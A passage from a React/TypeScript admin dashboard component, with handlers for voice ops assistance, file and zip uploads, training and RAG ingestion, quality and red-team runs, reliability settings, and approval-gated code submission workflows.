      setTwinOutput(data);
      addNotification({ type: "success", message: "Pending actions loaded." });
    } catch (err: any) {
      addNotification({ type: "error", message: `Pending load failed: ${err?.message || err}` });
    }
  };

  const ackMobileTwinActionReceipt = async () => {
    try {
      const data = await postJson("/dashboard/twin/mobile/action/receipt", {
        actionId: mobileTwinReceiptDraft.actionId.trim(),
        deviceId: mobileTwinReceiptDraft.deviceId.trim(),
        status: mobileTwinReceiptDraft.status,
        result: JSON.parse(mobileTwinReceiptDraft.resultJson || "{}"),
      });
      setTwinOutput(data);
      addNotification({ type: "success", message: "Action receipt submitted." });
      await refreshMobileTwinBridge();
    } catch (err: any) {
      addNotification({ type: "error", message: `Receipt submit failed: ${err?.message || err}` });
    }
  };

  const speakOps = (text: string) => {
    if (!opsVoiceAutoSpeak || !("speechSynthesis" in window)) return;
    try {
      if (opsVoiceLiveInterrupt) window.speechSynthesis.cancel();
      const utter = new SpeechSynthesisUtterance(text);
      utter.lang = opsVoiceLanguage || "en-US";
      utter.rate = 1;
      utter.pitch = 1;
      window.speechSynthesis.speak(utter);
    } catch {
      // no-op
    }
  };

  const clearOpsStreaming = () => {
    if (opsStreamTimerRef.current) {
      clearInterval(opsStreamTimerRef.current);
      opsStreamTimerRef.current = null;
    }
  };

  const streamOpsResponse = (assistant: any) => {
    clearOpsStreaming();
    const full = String(assistant?.response || "");
    if (!full) {
      setOpsVoiceStreamText("");
      setOpsVoiceOutput(assistant);
      return;
    }
    const tokens = full.split(/\s+/);
    let idx = 0;
    setOpsVoiceStreamText("");
    setOpsVoiceOutput({ ...assistant, partial_response: "" });
    opsStreamTimerRef.current = setInterval(() => {
      idx += 1;
      const partial = tokens.slice(0, idx).join(" ");
      setOpsVoiceStreamText(partial);
      setOpsVoiceOutput((prev: any) => ({ ...(prev || assistant), partial_response: partial }));
      if (idx >= tokens.length) {
        clearOpsStreaming();
        setOpsVoiceOutput({ ...assistant, partial_response: full });
      }
    }, 30);
  };

  const askOpsAssistant = async (queryOverride?: string) => {
    const query = String(queryOverride || opsVoiceQuery || "").trim();
    if (!query) {
      addNotification({ type: "warn", message: "Say or type a request first." });
      return;
    }
    try {
      const data = await postJson("/assistant/ops/ask", { query });
      const assistant = data?.assistant || {};
      const response = String(assistant?.response || "I have no response right now.");
      streamOpsResponse(assistant);
      setTwinOutput({ ...(twinOutput || {}), ops_assistant: assistant });
      addNotification({ type: "success", message: "Ops assistant responded." });
      speakOps(response);
    } catch (err: any) {
      addNotification({ type: "error", message: `Ops assistant failed: ${err?.message || err}` });
    }
  };

  const stopOpsListening = () => {
    setOpsVoiceListening(false);
    try {
      recognitionRef.current?.stop?.();
    } catch {
      // no-op
    }
  };

  const startOpsListening = () => {
    const SpeechRecognition =
      (window as any).SpeechRecognition || (window as any).webkitSpeechRecognition;
    if (!SpeechRecognition) {
      addNotification({ type: "warn", message: "Speech recognition not supported in this browser." });
      return;
    }
    try {
      if (opsVoiceLiveInterrupt && "speechSynthesis" in window) window.speechSynthesis.cancel();
      if (!recognitionRef.current) {
        const recognition = new SpeechRecognition();
        recognition.lang = opsVoiceLanguage || "en-US";
        recognition.continuous = true;
        recognition.interimResults = true;
        recognition.onresult = (event: any) => {
          let finalText = "";
          for (let i = event.resultIndex; i < event.results.length; i++) {
            const item = event.results[i];
            if (item.isFinal) finalText += String(item[0]?.transcript || "");
          }
          if (finalText.trim()) {
            setOpsVoiceQuery(finalText.trim());
            void askOpsAssistant(finalText.trim());
          }
        };
        recognition.onerror = () => {
          stopOpsListening();
        };
        recognition.onend = () => setOpsVoiceListening(false);
        recognitionRef.current = recognition;
      }
      recognitionRef.current.lang = opsVoiceLanguage || "en-US";
      recognitionRef.current.start();
      setOpsVoiceListening(true);
    } catch {
      setOpsVoiceListening(false);
      addNotification({ type: "error", message: "Unable to start microphone capture." });
    }
  };

  useEffect(() => {
    const supported = Boolean((window as any).SpeechRecognition || (window as any).webkitSpeechRecognition);
    setOpsVoiceSupported(supported);
    return () => {
      clearOpsStreaming();
      try {
        recognitionRef.current?.stop?.();
      } catch {
        // no-op
      }
      if ("speechSynthesis" in window) window.speechSynthesis.cancel();
    };
  }, []);

  useEffect(() => {
    if (!opsVoicePushToTalk || !opsVoiceSupported) return;
    const parseHotkey = (value: string) => {
      const txt = String(value || "").toLowerCase();
      return {
        alt: txt.includes("alt+"),
        ctrl: txt.includes("ctrl+"),
        shift: txt.includes("shift+"),
        key: txt.split("+").pop() || "v",
      };
    };
    const hk = parseHotkey(opsVoiceHotkey);
    const isTextInput = (el: any) =>
      !!el && (el.tagName === "INPUT" || el.tagName === "TEXTAREA" || el.isContentEditable);
    const match = (e: KeyboardEvent) => {
      const key = String(e.key || "").toLowerCase();
      return (
        key === hk.key &&
        Boolean(e.altKey) === hk.alt &&
        Boolean(e.ctrlKey) === hk.ctrl &&
        Boolean(e.shiftKey) === hk.shift
      );
    };
    const down = (e: KeyboardEvent) => {
      if (isTextInput(document.activeElement)) return;
      if (!match(e)) return;
      e.preventDefault();
      if (!opsVoiceListening) startOpsListening();
    };
    const up = (e: KeyboardEvent) => {
      if (!match(e)) return;
      e.preventDefault();
      if (opsVoiceListening) stopOpsListening();
    };
    window.addEventListener("keydown", down);
    window.addEventListener("keyup", up);
    return () => {
      window.removeEventListener("keydown", down);
      window.removeEventListener("keyup", up);
    };
  }, [opsVoicePushToTalk, opsVoiceHotkey, opsVoiceSupported, opsVoiceListening, opsVoiceLiveInterrupt, opsVoiceLanguage]);

  const handleTwinUpload = async (files: FileList | null) => {
    if (!files || files.length === 0) return;
    const next: Array<{ name: string; type: string; size: number; text_sample: string }> = [];
    for (const f of Array.from(files).slice(0, 100)) {
      const isTextLike =
        f.type.startsWith("text/") ||
        /\.(md|txt|json|ya?ml|ts|tsx|js|jsx|py|go|rs|java|sql|sh|env|toml|ini|csv)$/i.test(f.name);
      let textSample = "";
      if (isTextLike) {
        try {
          textSample = (await f.text()).slice(0, 8000);
        } catch {
          textSample = "";
        }
      }
      next.push({
        name: (f as any).webkitRelativePath || f.name,
        type: f.type || "application/octet-stream",
        size: f.size,
        text_sample: textSample,
      });
    }
    setTwinUploadedFiles((prev) => [...prev, ...next]);
    addNotification({ type: "success", message: `Twin received ${next.length} file(s).` });
  };

  const handleTwinZipUpload = async (files: FileList | null) => {
    if (!files || files.length === 0) return;
    const tierLimitsMb: Record<UploadTier, { perZip: number; total: number; wire: number }> = {
      founder: { perZip: 102400, total: 307200, wire: 30 }, // 100GB each, 300GB total policy
      admin: { perZip: 20480, total: 61440, wire: 25 }, // 20GB each, 60GB total policy
      paid: { perZip: 5120, total: 15360, wire: 20 }, // 5GB each, 15GB total policy
      free: { perZip: Number(import.meta.env.VITE_TWIN_MAX_ZIP_MB || 8), total: Number(import.meta.env.VITE_TWIN_MAX_TOTAL_ZIP_MB || 20), wire: 12 },
    };
    const policy = tierLimitsMb[twinUploadTier];
    const maxZipMb = policy.perZip;
    const maxTotalMb = policy.total;
    const maxWireMb = policy.wire; // direct JSON/base64 transfer practical ceiling
    const maxZipBytes = Math.max(1, maxZipMb) * 1024 * 1024;
    const maxTotalBytes = Math.max(1, maxTotalMb) * 1024 * 1024;
    const maxWireBytes = Math.max(1, maxWireMb) * 1024 * 1024;
    const zips = Array.from(files).filter((f) => f.name.toLowerCase().endsWith(".zip")).slice(0, 5);
    if (zips.length === 0) {
      addNotification({ type: "warn", message: "Select one or more .zip files." });
      return;
    }
    const encoded: Array<{ name: string; data_base64: string }> = [];
    let totalBytes = 0;
    for (const f of zips) {
      if (f.size > maxZipBytes) {
        addNotification({
          type: "warn",
          message: `Skipped ${f.name}: exceeds ${maxZipMb}MB per zip limit.`,
        });
        continue;
      }
      if (f.size > maxWireBytes) {
        const possiblePath = (f as any).path || (f as any).webkitRelativePath || "";
        if (possiblePath && !twinZipPath) {
          setTwinZipPath(possiblePath);
          addNotification({
            type: "info",
            message: `${f.name} is large. Switched to server-path mode via zip path.`,
          });
        } else {
          addNotification({
            type: "warn",
            message:
              `${f.name} is too large for browser JSON upload (${maxWireMb}MB wire limit). ` +
              `Use Server zip path mode for very large files (Founder/Admin large-file workflow).`,
          });
        }
        continue;
      }
      if (totalBytes + f.size > maxTotalBytes) {
        addNotification({
          type: "warn",
          message: `Upload limit reached (${maxTotalMb}MB total). Remaining zips skipped.`,
        });
        break;
      }
      try {
        const buf = await f.arrayBuffer();
        const bytes = new Uint8Array(buf);
        let binary = "";
        const chunk = 0x8000;
        for (let i = 0; i < bytes.length; i += chunk) {
          binary += String.fromCharCode(...bytes.subarray(i, i + chunk));
        }
        encoded.push({ name: f.name, data_base64: btoa(binary) });
        totalBytes += f.size;
      } catch {
        // skip failed file
      }
    }
    setTwinUploadedZips((prev) => [...prev, ...encoded]);
    addNotification({
      type: "success",
      message: `Twin received ${encoded.length} zip file(s). Tier: ${twinUploadTier}.`,
    });
  };

  const runBackendAction = async (path: string, body: any = {}) => {
    try {
      const isGet = path.startsWith("GET:");
      const target = isGet ? path.replace("GET:", "") : path;
      const data = isGet ? await getJson(target) : await postJson(target, body);
      setBackendOutput(data);
      addNotification({ type: "success", message: "Backend action completed." });
    } catch (err: any) {
      addNotification({ type: "error", message: `Backend action failed: ${err?.message || err}` });
    }
  };

  const runEndpointConsole = async () => {
    const path = endpointPath.trim();
    if (!path.startsWith("/")) {
      addNotification({ type: "error", message: "Path must start with /" });
      return;
    }
    if (endpointMethod === "GET") {
      await runBackendAction(`GET:${path}`);
      return;
    }
    let payload: any = {};
    const raw = endpointBody.trim();
    if (raw) {
      try {
        payload = JSON.parse(raw);
      } catch {
        addNotification({ type: "error", message: "Invalid JSON body." });
        return;
      }
    }
    await runBackendAction(path, payload);
  };

  const loadCreatorHistory = async () => {
    try {
      const data = await getJson("/creator/history?limit=50");
      setCreatorHistory(Array.isArray(data?.history) ? data.history : []);
    } catch (err: any) {
      addNotification({ type: "error", message: err?.message || "Failed to load creator history" });
    }
  };

  const pollCreatorJob = async (id: string) => {
    if (!id) return;
    setCreatorJobId(id);
    let attempts = 0;
    const maxAttempts = 120;
    while (attempts < maxAttempts) {
      attempts += 1;
      try {
        const data = await getJson(`/creator/job-status/${encodeURIComponent(id)}`);
        const job = data?.job || null;
        if (job) {
          setCreatorJob(job);
          if (job.status === "completed" || job.status === "failed") {
            setCreatorBusy(false);
            await loadCreatorHistory();
            return;
          }
        }
      } catch {
        // keep polling
      }
      await new Promise((r) => setTimeout(r, 1000));
    }
    setCreatorBusy(false);
  };

  const submitCreatorJob = async (path: string, payload: Record<string, any>) => {
    try {
      setCreatorBusy(true);
      const data = await postJson(path, payload);
      const id = String(data?.job_id || "");
      if (!id) {
        setCreatorBusy(false);
        addNotification({ type: "error", message: "Creator job did not return job ID" });
        return;
      }
      addNotification({ type: "success", message: `Creator job queued: ${id}` });
      await pollCreatorJob(id);
    } catch (err: any) {
      setCreatorBusy(false);
      addNotification({ type: "error", message: err?.message || "Creator job failed" });
    }
  };

  const parseTags = () =>
    trainingTagsCsv
      .split(",")
      .map((s) => s.trim())
      .filter(Boolean);

  const ingestTrainingText = async () => {
    const text = trainingText.trim();
    if (!text) {
      addNotification({ type: "warn", message: "Enter training text first." });
      return;
    }
    const data = await callAction("/admin/training/ingest/text", {
      title: trainingTitle.trim() || "manual_training",
      text,
      tags: parseTags(),
      options: trainingOptions,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `Training text ingested (${data.chars || 0} chars).` });
    }
  };

  const ingestTrainingUrls = async () => {
    const urls = trainingUrls
      .split(/\n+/)
      .map((u) => u.trim())
      .filter(Boolean);
    if (urls.length === 0) {
      addNotification({ type: "warn", message: "Paste one or more URLs first." });
      return;
    }
    const data = await callAction("/admin/training/ingest/urls", {
      urls,
      tags: parseTags(),
      options: trainingOptions,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `URL ingest complete. Accepted ${data.ingested || 0}.` });
      setBackendOutput(data);
    }
  };

  const ingestTrainingResearch = async () => {
    const query = trainingResearchQuery.trim();
    if (!query) {
      addNotification({ type: "warn", message: "Enter a research query first." });
      return;
    }
    const data = await callAction("/admin/training/ingest/research", {
      query,
      tags: parseTags(),
      options: trainingOptions,
    });
    if (data?.success) {
      addNotification({ type: "success", message: "Research ingest completed." });
      setBackendOutput(data);
    }
  };

  const readFileAsBase64 = async (file: File) => {
    const buf = await file.arrayBuffer();
    const bytes = new Uint8Array(buf);
    let binary = "";
    const chunk = 0x8000;
    for (let i = 0; i < bytes.length; i += chunk) {
      binary += String.fromCharCode(...bytes.subarray(i, i + chunk));
    }
    return btoa(binary);
  };

  const prepareTrainingFiles = async (files: FileList | null) => {
    if (!files || files.length === 0) return;
    const maxFiles = 200;
    const maxTextBytes = 2 * 1024 * 1024;
    const maxBinaryBytes = 4 * 1024 * 1024;
    const next: Array<{ name: string; type: string; textContent?: string; base64?: string }> = [];
    for (const f of Array.from(files).slice(0, maxFiles)) {
      const name = (f as any).webkitRelativePath || f.name;
      const lower = name.toLowerCase();
      const isText =
        f.type.startsWith("text/") ||
        /\.(md|txt|json|csv|ts|tsx|js|jsx|py|go|java|rs|sql|yaml|yml|html|css)$/i.test(lower);
      try {
        if (isText && f.size <= maxTextBytes) {
          const textContent = (await f.text()).slice(0, 200000);
          next.push({ name, type: f.type || "text/plain", textContent });
        } else if ((/\.zip$/i.test(lower) || /\.pdf$/i.test(lower) || !isText) && f.size <= maxBinaryBytes) {
          const base64 = await readFileAsBase64(f);
          next.push({ name, type: f.type || "application/octet-stream", base64 });
        }
      } catch {
        // skip unreadable file
      }
    }
    setTrainingUploadFiles((prev) => [...prev, ...next]);
    addNotification({ type: "success", message: `Prepared ${next.length} training file(s).` });
  };

  const ingestTrainingFiles = async () => {
    if (trainingUploadFiles.length === 0) {
      addNotification({ type: "warn", message: "Add files/folders/zip/pdf first." });
      return;
    }
    const data = await callAction("/admin/training/ingest/files", {
      files: trainingUploadFiles,
      tags: parseTags(),
      options: trainingOptions,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `File ingest complete. Accepted ${data.ingested || 0}.` });
      setBackendOutput(data);
    }
  };

  const loadTrainingOverview = async () => {
    try {
      const data = await getJson("/admin/training/overview?limit=2000");
      setTrainingOverview(data);
      addNotification({ type: "info", message: "Training overview refreshed." });
    } catch (err: any) {
      addNotification({ type: "error", message: err?.message || "Failed to load training overview." });
    }
  };

  const queueTrainingJob = async () => {
    const data = await callAction("/admin/training/jobs/run", {
      mode: trainingJobMode,
      evalSuite: trainingEvalSuite,
      options: trainingOptions,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `Training job queued (${data?.job?.id || "unknown"}).` });
      setBackendOutput(data);
    }
  };

  const ragBootstrapFromTraining = async () => {
    const data = await callAction("/admin/training/rag/bootstrap", {
      limit: 3000,
      domain: ragDomain,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `RAG bootstrapped from training samples (${data.sentDocs || 0} docs).` });
      setBackendOutput(data);
    }
  };

  const ragIngestQuick = async () => {
    const docs: Array<Record<string, any>> = [];
    if (trainingText.trim()) {
      docs.push({
        title: trainingTitle.trim() || "manual_rag_note",
        text: trainingText.trim(),
        domain: ragDomain,
        tags: parseTags(),
        source: "dashboard_training_studio",
      });
    }
    const urls = trainingUrls
      .split(/\n+/)
      .map((u) => u.trim())
      .filter(Boolean);
    if (docs.length === 0 && urls.length === 0) {
      addNotification({ type: "warn", message: "Add training text or URLs first for RAG ingest." });
      return;
    }
    const data = await callAction("/rag/ingest", {
      docs,
      urls,
      domain: ragDomain,
      tags: parseTags(),
      source: "dashboard",
      rebuild_index: true,
    });
    if (data?.ok) {
      addNotification({ type: "success", message: `RAG ingest complete (${data.created_chunks || 0} chunks).` });
      setBackendOutput(data);
    }
  };

  const ragAsk = async () => {
    const q = ragQuery.trim() || trainingResearchQuery.trim();
    if (!q) {
      addNotification({ type: "warn", message: "Enter a RAG question first." });
      return;
    }
    const data = await callAction("/rag/answer", {
      question: q,
      domain: ragDomain,
      top_k: 6,
      mode: "balanced",
      require_citations: true,
    });
    if (data?.ok) {
      addNotification({ type: "success", message: `RAG answer ready (${data.evidence_count || 0} evidence chunks).` });
      setBackendOutput(data);
    }
  };

  const runTrustedBootstrapPack = async () => {
    if (ragDomain === "general") {
      addNotification({ type: "warn", message: "Select medicine, agriculture, or market domain for trusted bootstrap pack." });
      return;
    }
    const data = await callAction("/admin/training/bootstrap-pack/run", {
      domain: ragDomain,
      includeSecondary: bootstrapIncludeSecondary,
      limit: bootstrapIncludeSecondary ? 18 : 10,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `Trusted seed pack ingested for ${ragDomain}.` });
      setBackendOutput(data);
    }
  };

  const runNightlyRefreshNow = async () => {
    const data = await callAction("/admin/training/bootstrap-pack/auto-refresh/run", {
      domain: ragDomain === "general" ? "" : ragDomain,
      includeSecondary: bootstrapIncludeSecondary,
      limit: bootstrapIncludeSecondary ? 18 : 12,
    });
    if (data?.success) {
      addNotification({ type: "success", message: "Nightly auto-refresh run executed." });
      setBackendOutput(data);
    }
  };

  const loadAutoRefreshStatus = async () => {
    const data = await callAction("GET:/admin/training/bootstrap-pack/auto-refresh/status", {});
    if (data?.success && data?.config) {
      setAutoRefreshEnabled(Boolean(data.config.enabled));
      setAutoRefreshHourUtc(String(data.config.hourUtc ?? "2"));
      setAutoRefreshMinuteUtc(String(data.config.minuteUtc ?? "10"));
      setAutoRefreshStaleHours(String(data.config.staleHours ?? "36"));
      setBackendOutput(data);
    }
  };

  const saveAutoRefreshConfig = async () => {
    const hourUtc = Math.max(0, Math.min(23, Number(autoRefreshHourUtc || 2)));
    const minuteUtc = Math.max(0, Math.min(59, Number(autoRefreshMinuteUtc || 10)));
    const staleHours = Math.max(12, Number(autoRefreshStaleHours || 36));
    const data = await callAction("/admin/training/bootstrap-pack/auto-refresh/config", {
      enabled: autoRefreshEnabled,
      hourUtc,
      minuteUtc,
      staleHours,
    });
    if (data?.success) {
      setAutoRefreshHourUtc(String(hourUtc));
      setAutoRefreshMinuteUtc(String(minuteUtc));
      setAutoRefreshStaleHours(String(staleHours));
      addNotification({ type: "success", message: "Auto-refresh config saved." });
      setBackendOutput(data);
    }
  };

  const refreshQualityInsights = async () => {
    if (!canAccessAdminOps) return;
    try {
      const [coverage, reliability, retrieval, trust, modelSummary] = await Promise.all([
        getJson("/admin/evals/coverage"),
        getJson("/admin/reliability/overview?windowHours=24"),
        getJson("/admin/retrieval/freshness?windowHours=72"),
        getJson("/admin/trust/signals?windowHours=72"),
        getJson("/admin/model-quality/summary"),
      ]);
      setQualityEvalCoverage(coverage?.coverage || null);
      setQualityReliability(reliability?.snapshot || null);
      setQualityRetrieval(retrieval?.summary || null);
      setQualityTrust(trust?.summary || null);
      setQualityModelSummary({
        router: modelSummary?.router || {},
        outcomes: modelSummary?.outcomes || {},
      });
      if (Array.isArray(modelSummary?.router?.variants)) {
        setModelRouterDraft(JSON.stringify(modelSummary.router.variants, null, 2));
      }
      try {
        const baselineData = await getJson("/admin/quality/benchmark/baselines");
        if (Array.isArray(baselineData?.baselines)) {
          setBenchmarkBaselinesDraft(JSON.stringify(baselineData.baselines, null, 2));
        }
      } catch {
        // ignore
      }
    } catch {
      // keep prior values; errors are shown when explicit action buttons are pressed
    }
  };

  const runQualityBatch = async () => {
    const data = await callAction("/admin/evals/run-batch", {
      suites: ["core", "reasoning", "coding", "research"],
    });
    if (data?.success) {
      addNotification({ type: "success", message: "Quality eval batch completed." });
      setBackendOutput(data);
      await refreshQualityInsights();
    }
  };

  const runQualityRedTeam = async () => {
    const data = await callAction("/admin/redteam/run", {});
    if (data?.success) {
      addNotification({ type: "success", message: "Red-team suite completed." });
      setBackendOutput(data);
      await refreshQualityInsights();
    }
  };

  const runQualityHardening = async () => {
    const data = await callAction("/admin/quality/hardening/run", {});
    if (data?.success) {
      addNotification({ type: "success", message: "Quality hardening run completed." });
      setBackendOutput(data);
      await refreshQualityInsights();
    }
  };

  const saveModelRouterFromDashboard = async () => {
    let variants: any[] = [];
    try {
      variants = JSON.parse(modelRouterDraft || "[]");
    } catch {
      addNotification({ type: "error", message: "Invalid model router JSON." });
      return;
    }
    if (!Array.isArray(variants) || variants.length === 0) {
      addNotification({ type: "error", message: "Add at least one model variant." });
      return;
    }
    const data = await callAction("/admin/model-quality/router", { variants });
    if (data?.success) {
      addNotification({ type: "success", message: "Model router saved." });
      setBackendOutput(data);
      await refreshQualityInsights();
    }
  };

  const saveBenchmarkBaselinesFromDashboard = async () => {
    let baselines: any[] = [];
    try {
      baselines = JSON.parse(benchmarkBaselinesDraft || "[]");
    } catch {
      addNotification({ type: "error", message: "Invalid benchmark baselines JSON." });
      return;
    }
    if (!Array.isArray(baselines) || baselines.length === 0) {
      addNotification({ type: "error", message: "Add at least one benchmark baseline." });
      return;
    }
    const data = await callAction("/admin/quality/benchmark/baselines", { baselines });
    if (data?.success) {
      addNotification({ type: "success", message: "Benchmark baselines saved." });
      setBackendOutput(data);
    }
  };

  const refreshMarketReadiness = async () => {
    if (!canAccessAdminOps) return;
    const [cfg, summary] = await Promise.all([
      callAction("GET:/admin/market-readiness/config", {}),
      callAction("GET:/admin/market-readiness/summary", {}),
    ]);
    if (cfg?.config) setBackendOutput(cfg);
    if (summary?.summary) setBackendOutput(summary);
  };

  const refreshReliabilityProgram = async () => {
    if (!canAccessAdminOps) return;
    const data = await callAction("GET:/admin/reliability/program", {});
    if (data?.program) {
      setReliabilityProgram(data.program);
      if (data.program?.slo) {
        setSloDraft({
          availabilityPct: String(data.program.slo.availabilityPct ?? "99.9"),
          p95LatencyMs: String(data.program.slo.p95LatencyMs ?? "2500"),
          errorBudgetPct: String(data.program.slo.errorBudgetPct ?? "0.1"),
          windowDays: String(data.program.slo.windowDays ?? "30"),
          owner: String(data.program.slo.owner || "sre"),
        });
      }
      if (data.program?.canary) {
        setCanaryTrafficPct(String(data.program.canary.trafficPct ?? 5));
        setCanaryAutoRollback(Boolean(data.program.canary.autoRollback ?? true));
      }
      if (data.program?.statusPage) {
        setStatusPageMode(data.program.statusPage.mode || "operational");
        setStatusPageMessage(String(data.program.statusPage.message || "All systems operational."));
      }
    }
  };

  const saveSloProgram = async () => {
    const data = await callAction("/admin/reliability/slo", {
      slo: {
        availabilityPct: Number(sloDraft.availabilityPct || 99.9),
        p95LatencyMs: Number(sloDraft.p95LatencyMs || 2500),
        errorBudgetPct: Number(sloDraft.errorBudgetPct || 0.1),
        windowDays: Number(sloDraft.windowDays || 30),
        owner: sloDraft.owner || "sre",
      },
    });
    if (data?.success) {
      addNotification({ type: "success", message: "SLO policy updated." });
      await refreshReliabilityProgram();
    }
  };

  const runCanaryNow = async () => {
    const data = await callAction("/admin/reliability/canary/run", {
      trafficPct: Number(canaryTrafficPct || 5),
      autoRollback: canaryAutoRollback,
    });
    if (data?.success) {
      addNotification({
        type: data?.result?.rollbackTriggered ? "warn" : "success",
        message: data?.result?.rollbackTriggered
          ? "Canary triggered rollback recommendation."
          : "Canary run completed.",
      });
      setBackendOutput(data);
      await refreshReliabilityProgram();
    }
  };

  const updateStatusPage = async () => {
    const data = await callAction("/admin/reliability/status-page", {
      mode: statusPageMode,
      message: statusPageMessage,
    });
    if (data?.success) {
      addNotification({ type: "success", message: "Status page updated." });
      await refreshReliabilityProgram();
    }
  };

  const createReliabilityIncident = async () => {
    if (!incidentTitle.trim()) {
      addNotification({ type: "warn", message: "Enter incident title." });
      return;
    }
    const data = await callAction("/admin/reliability/incident", {
      title: incidentTitle.trim(),
      severity: incidentSeverity,
      summary: incidentSummary.trim(),
      status: "open",
    });
    if (data?.success) {
      addNotification({ type: "success", message: `Incident created: ${incidentTitle}` });
      setIncidentTitle("");
      setIncidentSummary("");
      await refreshReliabilityProgram();
    }
  };

  const refreshNeuroExpansion = async () => {
    if (!(dashboardRole === "founder" || dashboardRole === "admin" || dashboardRole === "developer")) return;
    try {
      const data = await getJson("/admin/dashboard/neuroexpansion/bootstrap");
      if (data?.neuroExpansion) {
        setNeuroExpansion(data.neuroExpansion);
        const settings = data.neuroExpansion.settings || {};
        setNeuroExpansionSettingsDraft({
          enabled: Boolean(settings.enabled ?? true),
          autoDailyScan: Boolean(settings.autoDailyScan ?? true),
          requireFounderApproval: Boolean(settings.requireFounderApproval ?? true),
          autoTestOnMerge: Boolean(settings.autoTestOnMerge ?? true),
          placeholderScanRoots: Array.isArray(settings.placeholderScanRoots)
            ? settings.placeholderScanRoots.join(",")
            : "src,../frontend/src,../ml",
          maxFindings: String(settings.maxFindings ?? 500),
        });
      }
      if (dashboardRole === "founder" || dashboardRole === "admin") {
        try {
          const n = await getJson("/admin/dashboard/neuroexpansion/notifications");
          if (Array.isArray(n?.notifications)) setNeuroExpansionNotifications(n.notifications);
        } catch {
          // ignore notification feed fetch errors
        }
      }
    } catch {
      // silently ignore when account lacks dashboard neuro-expansion access
    }
  };

  const saveNeuroExpansionSettingsNow = async () => {
    const roots = neuroExpansionSettingsDraft.placeholderScanRoots
      .split(",")
      .map((x) => x.trim())
      .filter(Boolean);
    const data = await callAction("/admin/dashboard/neuroexpansion/settings/save", {
      settings: {
        enabled: neuroExpansionSettingsDraft.enabled,
        autoDailyScan: neuroExpansionSettingsDraft.autoDailyScan,
        requireFounderApproval: neuroExpansionSettingsDraft.requireFounderApproval,
        autoTestOnMerge: neuroExpansionSettingsDraft.autoTestOnMerge,
        placeholderScanRoots: roots.length > 0 ? roots : ["src", "../frontend/src", "../ml"],
        maxFindings: Number(neuroExpansionSettingsDraft.maxFindings || 500),
      },
    });
    if (data?.success) {
      addNotification({ type: "success", message: "NeuroExpansion settings saved." });
    }
  };

  const submitNeuroExpansionNow = async () => {
    if (!neuroExpansionTitle.trim() || !neuroExpansionFeature.trim()) {
      addNotification({ type: "warn", message: "Add title and feature details first." });
      return;
    }
    const data = await callAction("/admin/dashboard/neuroexpansion/submit", {
      title: neuroExpansionTitle.trim(),
      featureText: neuroExpansionFeature.trim(),
      codeText: neuroExpansionCode.trim(),
    });
    if (data?.success) {
      const blocked = String(data?.submission?.status || "") === "blocked";
      addNotification({
        type: blocked ? "warn" : "success",
        message: blocked
          ? "Submission blocked by security scan/doctrine."
          : "Submission queued for founder/admin approval.",
      });
      setNeuroExpansionTitle("");
      setNeuroExpansionFeature("");
      setNeuroExpansionCode("");
      await refreshNeuroExpansion();
    }
  };

  const reviewNeuroExpansionNow = async (id: string, decision: "approve" | "reject") => {
    const data = await callAction("/admin/dashboard/neuroexpansion/review", {
      id,
      decision,
      reason: neuroExpansionReviewReason.trim(),
    });
    if (data?.success) {
      addNotification({
        type: decision === "approve" ? "success" : "warn",
        message: `Submission ${decision}d.`,
      });
      setNeuroExpansionReviewReason("");
      await refreshNeuroExpansion();
    }
  };

  const mergeNeuroExpansionNow = async (id: string) => {
    const data = await callAction("/admin/dashboard/neuroexpansion/merge", {
      id,
      testsRequested: neuroExpansionSettingsDraft.autoTestOnMerge,
    });
    if (data?.success) {
      addNotification({ type: "success", message: "Submission merged into generated artifact queue." });
      await refreshNeuroExpansion();
    }
  };

  const previewNeuroExpansionPatchNow = async (id: string) => {
    const data = await callAction("/admin/dashboard/neuroexpansion/patch/preview", { id });
    if (data?.success) {
      setBackendOutput(data);
      addNotification({ type: "success", message: "Patch preview generated." });
    }
  };

  const applyNeuroExpansionPatchNow = async (id: string) => {
    const data = await callAction("/admin/dashboard/neuroexpansion/patch/apply", {
      id,
      runTests: neuroExpansionPatchRunTests,
      testCommand: neuroExpansionPatchTestCommand.trim() || "pnpm run typecheck",
    });
    if (data?.success) {
      setBackendOutput(data);
      addNotification({
        type: data?.testResult?.ok === false ? "warn" : "success",
        message: data?.testResult?.ok === false
          ? "Patch applied, but test run failed. Use checkpoint restore hint."
          : "Patch applied successfully.",
      });
      await refreshNeuroExpansion();
    }
  };

  const generateNeuroExpansionPrNow = async (id: string) => {
    const data = await callAction("/admin/dashboard/neuroexpansion/pr/generate", {
      id,
      baseBranch: neuroExpansionPrBaseBranch.trim() || "main",
      materializeBranch: neuroExpansionPrMaterialize,
      push: neuroExpansionPrPush,
      remote: "origin",
    });
    if (data?.success) {
      setBackendOutput(data);
      addNotification({ type: "success", message: "PR draft generated." });
    }
  };

  const scanPlaceholderGapsNow = async () => {
    const data = await callAction("/admin/dashboard/neuroexpansion/scan-placeholders", {});
    if (data?.success) {
      setNeuroExpansionPlaceholderReport(data.report || null);
      addNotification({
        type: "success",
        message: `Placeholder scan complete (${Number(data?.report?.totalFindings || 0)} findings).`,
      });
    }
  };

  const runNeuroExpansionDailyNow = async () => {
    const data = await callAction("/admin/dashboard/neuroexpansion/daily/run", {});
    if (data?.success) {
      addNotification({
        type: data?.result?.skipped ? "warn" : "success",
        message: data?.result?.skipped
          ? `Daily planner skipped: ${data?.result?.reason || "already_ran_recently"}`
          : "Daily planner generated a new approval proposal.",
      });
      await refreshNeuroExpansion();
    }
  };

  const createArtifact = () => {
    if (!artifactDraft.title.trim() || !artifactDraft.body.trim()) {
      addNotification({ type: "warn", message: "Add artifact title and content first." });
      return;
    }
    const owner = currentUserLabel();
    const now = Date.now();
    const next: ArtifactWorkspaceItem = {
      id: `art-${now}`,
      title: artifactDraft.title.trim(),
      type: artifactDraft.type,
      body: artifactDraft.body,
      owner,
      visibility: artifactDraft.visibility,
      updatedAt: now,
    };
    setArtifactWorkspace((prev) => [next, ...prev]);
    setArtifactDraft((p) => ({ ...p, title: "", body: "" }));
    addNotification({ type: "success", message: "Artifact saved to workspace." });
  };

  const deleteArtifact = (id: string) => {
    setArtifactWorkspace((prev) => prev.filter((a) => a.id !== id));
  };

  const saveMarketReadiness = async () => {
    const data = await callAction("/admin/market-readiness/config", marketReadinessConfig);
    if (data?.success) {
